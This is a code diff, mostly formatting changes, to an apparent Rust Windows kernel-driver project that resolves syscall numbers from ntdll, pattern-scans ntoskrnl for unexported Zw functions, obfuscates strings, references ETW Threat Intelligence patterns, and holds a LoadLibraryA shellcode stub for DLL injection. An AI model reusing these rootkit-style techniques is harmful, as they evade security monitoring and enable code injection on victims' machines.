@@ -1,33 +1,23 @@
-use obfstr::obfstr;
 use core::{
-    ffi::{c_void, CStr},
+    ffi::{CStr, c_void},
     ptr::{null_mut, read},
     slice::from_raw_parts,
 };
+use obfstr::obfstr;
 
 use wdk_sys::{
-    *,
     _SECTION_INHERIT::ViewUnmap,
-    ntddk::{
-        ZwClose, ZwMapViewOfSection, 
-        ZwOpenSection, ZwUnmapViewOfSection
-    },
+    ntddk::{ZwClose, ZwMapViewOfSection, ZwOpenSection, ZwUnmapViewOfSection},
+    *,
 };
 
 use {
-    super::{
-        address::get_module_base_address, 
-        InitializeObjectAttributes
-    },
+    super::{InitializeObjectAttributes, address::get_module_base_address},
     crate::{
-        data::{
-            IMAGE_DOS_HEADER, 
-            IMAGE_EXPORT_DIRECTORY, 
-            IMAGE_NT_HEADERS, 
-            IMAGE_SECTION_HEADER,
-        },
-        error::ShadowError, 
-        utils::uni, Result
+        Result,
+        data::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS, IMAGE_SECTION_HEADER},
+        error::ShadowError,
+        utils::uni,
     },
 };
 
@@ -54,7 +44,10 @@ pub unsafe fn scan_for_pattern(
 ) -> Result<*mut u8> {
     let function_bytes = from_raw_parts(function_address as *const u8, size);
 
-    if let Some(x) = function_bytes.windows(pattern.len()).position(|window| window == pattern) {
+    if let Some(x) = function_bytes
+        .windows(pattern.len())
+        .position(|window| window == pattern)
+    {
         let position = x + offset;
 
         // Converting the slice starting at the position to i32 (little-endian)
@@ -97,7 +90,11 @@ pub unsafe fn get_syscall_index(function_name: &str) -> Result<u16> {
         None,
     );
 
-    let mut status = ZwOpenSection(&mut section_handle, SECTION_MAP_READ | SECTION_QUERY, &mut obj_attr);
+    let mut status = ZwOpenSection(
+        &mut section_handle,
+        SECTION_MAP_READ | SECTION_QUERY,
+        &mut obj_attr,
+    );
     if !NT_SUCCESS(status) {
         return Err(ShadowError::ApiCallFailed("ZwOpenSection", status));
     }
@@ -126,11 +123,13 @@ pub unsafe fn get_syscall_index(function_name: &str) -> Result<u16> {
 
     // Locate export directory, names, and functions for syscall extraction
     let dos_header = ntdll_addr as *const IMAGE_DOS_HEADER;
-    let nt_header = (ntdll_addr as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS;
+    let nt_header =
+        (ntdll_addr as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS;
     let ntdll_addr = ntdll_addr as usize;
 
     // Retrieves the size of the export table
-    let export_directory = (ntdll_addr + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
+    let export_directory = (ntdll_addr
+        + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
         as *const IMAGE_EXPORT_DIRECTORY;
 
     // Retrieving information from module names
@@ -181,7 +180,10 @@ pub unsafe fn get_syscall_index(function_name: &str) -> Result<u16> {
     ZwUnmapViewOfSection(-1isize as HANDLE, ntdll_addr as *mut c_void);
     ZwClose(section_handle);
 
-    Err(ShadowError::FunctionExecutionFailed("get_syscall_index", line!()))
+    Err(ShadowError::FunctionExecutionFailed(
+        "get_syscall_index",
+        line!(),
+    ))
 }
 
 /// Finds the address of a specified Zw function by scanning the system kernel's `.text` section.
@@ -204,8 +206,10 @@ pub unsafe fn find_zw_function(name: &str) -> Result<usize> {
     ZW_PATTERN[22] = ssn_bytes[1];
 
     let dos_header = ntoskrnl_addr as *const IMAGE_DOS_HEADER;
-    let nt_header = (ntoskrnl_addr as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
-    let section_header = (nt_header as usize + size_of::<IMAGE_NT_HEADERS>()) as *const IMAGE_SECTION_HEADER;
+    let nt_header =
+        (ntoskrnl_addr as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
+    let section_header =
+        (nt_header as usize + size_of::<IMAGE_NT_HEADERS>()) as *const IMAGE_SECTION_HEADER;
 
     // Scan the `.text` section for the matching pattern
     for i in 0..(*nt_header).FileHeader.NumberOfSections as usize {
@@ -213,7 +217,8 @@ pub unsafe fn find_zw_function(name: &str) -> Result<usize> {
         let name = core::str::from_utf8(&section).unwrap().trim_matches('\0');
 
         if name == obfstr!(".text") {
-            let text_start = ntoskrnl_addr as usize + (*section_header.add(i)).VirtualAddress as usize;
+            let text_start =
+                ntoskrnl_addr as usize + (*section_header.add(i)).VirtualAddress as usize;
             let text_end = text_start + (*section_header.add(i)).Misc.VirtualSize as usize;
             let data = core::slice::from_raw_parts(text_start as *const u8, text_end - text_start);
 
@@ -229,7 +234,10 @@ pub unsafe fn find_zw_function(name: &str) -> Result<usize> {
         }
     }
 
-    Err(ShadowError::FunctionExecutionFailed("find_zw_function", line!()))
+    Err(ShadowError::FunctionExecutionFailed(
+        "find_zw_function",
+        line!(),
+    ))
 }
 
 /// The `ETWTI_PATTERN` represents a sequence of machine instructions used for
@@ -256,10 +264,10 @@ pub static mut ZW_PATTERN: [u8; 30] = [
 ];
 
 pub static mut LDR_SHELLCODE: [u8; 31] = [
-    0x48, 0x83, 0xEC, 0x28,                                      // sub rsp, 0x28
-    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, LoadLibraryA
-    0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rcx, &DllPath
-    0xFF, 0xD0,                                                  // call rax
-    0x48, 0x83, 0xC4, 0x28,                                      // add rsp, 0x28
-    0xC3                                                         // ret
+    0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
+    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, LoadLibraryA
+    0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, &DllPath
+    0xFF, 0xD0, // call rax
+    0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
+    0xC3, // ret
 ];
